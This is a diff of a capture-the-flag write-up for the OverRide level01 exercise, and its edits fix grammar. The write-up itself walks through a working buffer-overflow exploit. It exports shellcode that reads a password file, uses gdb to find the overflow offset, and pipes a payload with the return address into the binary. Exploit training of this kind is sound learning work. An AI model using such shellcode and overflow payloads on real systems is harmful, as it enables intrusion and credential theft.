@@ -1,7 +1,7 @@
-Same thing as the bonus0 of rainfall (we got two read so we need to feed 2 arguments directly).
+Same thing as the bonus0 of rainfall (we got two reads so we need to feed 2 arguments directly).
 There is still a small difference, we can overflow the second read but not the first, since the first one is a global variable and the second has a pre-defined max length.
 
-So first we export our shellcode. This shellcode is different : it doesn't run a shell, but it outputs the content of a file's given path (found here: http://shell-storm.org/shellcode/files/shellcode-73.php) :
+So, we first export our shellcode. This shellcode is different : it doesn't run a shell, but it outputs the content of a file's given path (found here: http://shell-storm.org/shellcode/files/shellcode-73.php) :
 
 ```bash
 bonus0@RainFall:~$ export SHELLCODE=`python -c 'print("\x90" * 30 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level02/.pass")'`
@@ -28,9 +28,9 @@ Breakpoint 1, 0x080484d5 in main ()
 0xffffd7f2:	0x90909090	0x90909090	0x90909090	0xdb31c031
 ```
 
-It is stored since the address `0xffffd7d0` but to be sure we will put `0xffffd7e2` in the stack.
+It's storage begins at the address `0xffffd7d0` but to be sure, we will put `0xffffd7e2`'s stack address.
 
-We then need to defined when the buffer start to overflow: (we know by looking inside the decompiled code that the username is `dat_wil`)
+We then need to define when the buffer starts to overflow: (we know by looking inside the decompiled code that the username is `dat_wil`)
 >level01@OverRide:~$ gdb -q ./level01 
 >Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
 >(gdb) r
@@ -44,7 +44,7 @@ We then need to defined when the buffer start to overflow: (we know by looking i
 >Program received signal SIGSEGV, Segmentation fault.
 >0x55555555 in ?? ()
 
-So it segfault from byte 81 to byte 84. That's where we need to put the address of the environment variable found previously :
+So it segfaults from byte 81 to byte 84. That's where we need to put the address of the environment variable found previously :
 
 >level01@OverRide:~$ { python -c 'print("dat_wil" * 20)'; python -c 'print("BBBB" * 20 + 3 * "\xe2\xd7\xff\xff")'; } | ./level01
 >********* ADMIN LOGIN PROMPT *********
